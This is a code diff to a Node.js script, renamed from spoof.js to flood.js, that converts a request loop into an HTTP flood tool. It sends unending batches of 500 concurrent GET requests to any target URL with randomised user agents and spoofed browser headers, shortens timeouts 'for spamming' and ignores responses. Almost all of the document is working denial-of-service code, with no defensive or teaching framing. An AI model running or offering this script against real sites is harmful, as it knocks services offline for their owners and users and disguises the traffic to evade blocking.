@@ -3,20 +3,21 @@ const fs = require('fs');
 
 const target = process.argv[2];
 if (!target) {
-  console.error('Usage: node spoof.js <target_url>');
+  console.error('Usage: node flood.js <target_url>');
   process.exit(1);
 }
 
 // Load user-agents
 const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
 
-// Spoofed headers template
+// Spoofed headers generator
 function getSpoofedHeaders() {
   const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
 
   return {
     'User-Agent': ua,
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-US,en;q=0.9',
     'Upgrade-Insecure-Requests': '1',
     'DNT': '1',
@@ -33,24 +34,38 @@ function randomIP() {
   return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
 }
 
-// Send spoofed request
+// Send one spoofed request
 async function sendSpoofedRequest(id) {
   try {
-    const res = await axios.get(target, {
+    await axios.get(target, {
       headers: getSpoofedHeaders(),
-      timeout: 25000,
+      timeout: 10000, // shorter timeout for spamming
+      validateStatus: () => true, // accept ANY status code
     });
-    console.log(`#${id} -> ${res.status}`);
+    console.log(`Request #${id} sent.`);
   } catch (err) {
-    console.error(`#${id} -> Error: ${err.message}`);
+    console.error(`Request #${id} error: ${err.message}`);
   }
 }
 
-// Run loop
-(async () => {
+// Pure flood function
+async function startFlood() {
   let count = 0;
+
   while (true) {
-    count++;
-    await sendSpoofedRequest(count);
+    const batch = [];
+
+    for (let i = 0; i < 500; i++) {
+      count++;
+      batch.push(sendSpoofedRequest(count));
+    }
+
+    // Fire 500 requests at once, but don't wait for responses
+    Promise.allSettled(batch);
+
+    console.log(`> 500 Requests Fired! Total Sent: ${count}`);
   }
-})();
+}
+
+// Start the flood
+startFlood();
